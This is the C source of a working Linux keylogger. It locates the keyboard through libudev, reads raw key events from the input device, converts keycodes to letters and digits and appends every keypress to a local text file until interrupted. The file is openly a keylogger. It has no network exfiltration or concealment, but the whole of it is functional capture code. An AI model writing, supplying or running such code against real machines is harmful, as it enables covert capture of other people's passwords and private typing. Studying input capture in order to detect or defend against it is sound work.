#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <stdbool.h>
#include <signal.h>

#include <string.h>
#include <libudev.h>

volatile bool running = true;

void break_keylogger(){
	running = false;
}

char keycode_to_char(const unsigned int in){
	switch(in){
		// This does not account for special keys
		// Codes to num
		case 2: return '1';
		case 3: return '2';
		case 4: return '3';
		case 5: return '4';
		case 6: return '5';
		case 7: return '6';
		case 8: return '7';
		case 9: return '8';
		case 10: return '9';
		case 11: return '0';

		// Row 1 codes
		case 16: return 'q';
		case 17: return 'w';
		case 18: return 'e';
		case 19: return 'r';
		case 20: return 't';
		case 21: return 'y';
		case 22: return 'u';
		case 23: return 'i';
		case 24: return 'o';
		case 25: return 'p';

		// Row 2 codes
		case 30: return 'a';
		case 31: return 's';
		case 32: return 'd';
		case 33: return 'f';
		case 34: return 'g';
		case 35: return 'h';
		case 36: return 'j';
		case 37: return 'k';
		case 38: return 'l';

		// Row 3 codes
		case 44: return 'z';
		case 45: return 'x';
		case 46: return 'c';
		case 47: return 'v';
		case 48: return 'b';
		case 49: return 'n';
		case 50: return 'm';

		// Special cases
		case 57: return ' ';
		default: return '?';
	}	
}

char* keyboard_path(){
	// Return char*
	char* keyboard_path = NULL;

	// Create udev
	struct udev *udev = udev_new();
	
	// Create devices list and fetch+store all input devices
	struct udev_enumerate *enumerate = udev_enumerate_new(udev);
	udev_enumerate_add_match_subsystem(enumerate, "input");
	udev_enumerate_scan_devices(enumerate);

	// List of input devices
	struct udev_list_entry *devices = udev_enumerate_get_list_entry(enumerate);

	// Storage for iterating input devices
	struct udev_list_entry *entry;

	udev_list_entry_foreach(entry, devices){
		// Get path to device
		const char *path = udev_list_entry_get_name(entry);
		
		// Obtain device
		struct udev_device *device = udev_device_new_from_syspath(udev, path);

		// Get device node path and device ID	
		const char *devnode = udev_device_get_devnode(device);
		const char *iskeyboard = udev_device_get_property_value(device, "ID_INPUT_KEYBOARD");

		// Keyboard device ID is 1
		if(iskeyboard && devnode && strcmp(iskeyboard, "1") == 0){
			// Store path
			keyboard_path = malloc(strlen(devnode) + 1);			
			strcpy(keyboard_path, devnode);

			// Free device
			udev_device_unref(device);
			break;
		}
		
		// Free device
		udev_device_unref(device);
	}

	// Free everything else
	udev_enumerate_unref(enumerate);
	udev_unref(udev);

	return keyboard_path;
}

int main(){
	// Keyboard path
	const char *path = keyboard_path();
	if(!path){
		fprintf(stderr, "Keyboard not found\n");
		return 1;
	}

	// Get file handle
	int fd = open(path, O_RDONLY);
	free((void *)path);

	if(fd == -1){
		fprintf(stderr, "Failed to open keyboard\n");
		return 1;
	}

	// Ctrl+C breaks the keylogger
	signal(SIGINT, break_keylogger);

	// Open output file append mode
	FILE *outfile = fopen("keylogger_output.txt", "a");
	if(!outfile){
		fprintf(stderr, "Failed to open output file\n");
		close(fd);
		return 1;
	}

	while(running){
		// Read and save input event
		struct input_event ev;
		ssize_t bytes = read(fd, &ev, sizeof(struct input_event));

		// Failed to read event
		if(bytes == (ssize_t) - 1){
			fprintf(stderr, "Failed to read\n");
			break;
		}
		// Event is not a keypress
		if(bytes != sizeof(ev)){
			fprintf(stderr, "Incomplete read\n");
			break;
		}
		// Record keypress
		if(ev.type == EV_KEY && ev.value == 1){
			fputc(keycode_to_char(ev.code), outfile);
			fflush(outfile);
		}
	}

	fclose(outfile);
	close(fd);
	return 0;
}
